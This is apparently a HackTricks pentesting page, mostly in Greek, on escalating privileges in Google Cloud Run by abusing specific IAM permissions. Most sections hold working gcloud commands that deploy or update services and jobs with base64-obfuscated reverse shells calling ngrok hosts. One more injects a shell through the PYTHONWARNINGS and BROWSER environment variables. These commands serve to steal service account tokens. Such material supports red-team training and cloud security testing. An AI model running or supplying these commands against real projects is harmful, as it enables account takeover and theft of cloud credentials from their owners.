# GCP - Run Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Run

Για περισσότερες πληροφορίες σχετικά με το Cloud Run δείτε:

{{#ref}}
../gcp-services/gcp-cloud-run-enum.md
{{#endref}}

### `run.services.create` , `iam.serviceAccounts.actAs`, **`run.routes.invoke`**

Ένας επιτιθέμενος με αυτά τα permissions μπορεί να **create a run service running arbitrary code** (arbitrary Docker container), να επισυνάψει ένα Service Account σε αυτό, και να κάνει τον κώδικα να **exfiltrate the Service Account token from the metadata**.

Ένα exploit script για αυτή τη μέθοδο μπορεί να βρεθεί [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/run.services.create.py) και το Docker image μπορεί να βρεθεί [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudRunDockerImage).

Σημειώστε ότι όταν χρησιμοποιείτε `gcloud run deploy` αντί να δημιουργήσετε απλώς την υπηρεσία **it needs the `update` permission`**. Check an [**example here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/o-run.services.create.sh).

### `run.services.update` , `iam.serviceAccounts.actAs`

Όπως το προηγούμενο αλλά ενημερώνοντας μια υπηρεσία:

<details>
<summary>Deploy Cloud Run service with reverse shell</summary>
```bash
# Launch some web server to listen in port 80 so the service works
echo "python3 -m http.server 80;sh -i >& /dev/tcp/0.tcp.eu.ngrok.io/14348 0>&1" | base64
# cHl0aG9uMyAtbSBodHRwLnNlcnZlciA4MDtzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5ldS5uZ3Jvay5pby8xNDM0OCAwPiYxCg==

gcloud run deploy hacked \
--image=ubuntu:22.04 \  # Make sure to use an ubuntu version that includes python3
--command=bash \
--args="-c,echo cHl0aG9uMyAtbSBodHRwLnNlcnZlciA4MDtzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5ldS5uZ3Jvay5pby8xNDM0OCAwPiYxCg== | base64 -d | bash" \
--service-account="<proj-num>-compute@developer.gserviceaccount.com" \
--region=us-central1 \
--allow-unauthenticated

# If you don't have permissions to use "--allow-unauthenticated", dont use it
```
</details>

### `run.services.setIamPolicy`

Χορηγήστε στον εαυτό σας δικαιώματα στο cloud Run.

### `run.jobs.create`, `run.jobs.run`, `iam.serviceaccounts.actAs`,(`run.jobs.get`)

Εκκινήστε ένα job με reverse shell για να κλέψετε το service account που υποδεικνύεται στην εντολή. Μπορείτε να βρείτε ένα [**exploit here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/m-run.jobs.create.sh).

<details>
<summary>Δημιουργία Cloud Run job με reverse shell</summary>
```bash
gcloud beta run jobs create jab-cloudrun-3326 \
--image=ubuntu:latest \
--command=bash \
--args="-c,echo c2ggLWkgPiYgL2Rldi90Y3AvNC50Y3AuZXUubmdyb2suaW8vMTIxMzIgMD4mMQ== | base64 -d | bash" \
--service-account="<sa>@$PROJECT_ID.iam.gserviceaccount.com" \
--region=us-central1

```
</details>

### `run.jobs.update`,`run.jobs.run`,`iam.serviceaccounts.actAs`,(`run.jobs.get`)

Παρόμοια με το προηγούμενο, είναι δυνατό να **update a job and update the SA**, να αλλάξετε την **command** και να την **execute**:

<details>
<summary>Ενημέρωση Cloud Run job και εκτέλεση με reverse shell</summary>
```bash
gcloud beta run jobs update hacked \
--image=mubuntu:latest \
--command=bash \
--args="-c,echo c2ggLWkgPiYgL2Rldi90Y3AvNy50Y3AuZXUubmdyb2suaW8vMTQ4NDEgMD4mMQ== | base64 -d | bash" \
--service-account=<proj-num>-compute@developer.gserviceaccount.com \
--region=us-central1 \
--execute-now
```
</details>

### `run.jobs.setIamPolicy`

Χορηγήστε στον εαυτό σας τα προηγούμενα δικαιώματα σε Cloud Jobs.

### `run.jobs.run`, `run.jobs.runWithOverrides`, (`run.jobs.get`)

Καταχραστείτε τα env variables μιας εκτέλεσης job για να execute arbitrary code και να αποκτήσετε ένα reverse shell για να dump τα περιεχόμενα του container (source code) και να έχετε πρόσβαση στο SA μέσα στα metadata:

<details>
<summary>Εκτέλεση Cloud Run job with environment variable exploitation</summary>
```bash
gcloud beta run jobs execute job-name --region <region> --update-env-vars="PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=/bin/bash -c 'bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/14195 0>&1' #%s"
```
</details>

## Αναφορές

- [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{{#include ../../../banners/hacktricks-training.md}}
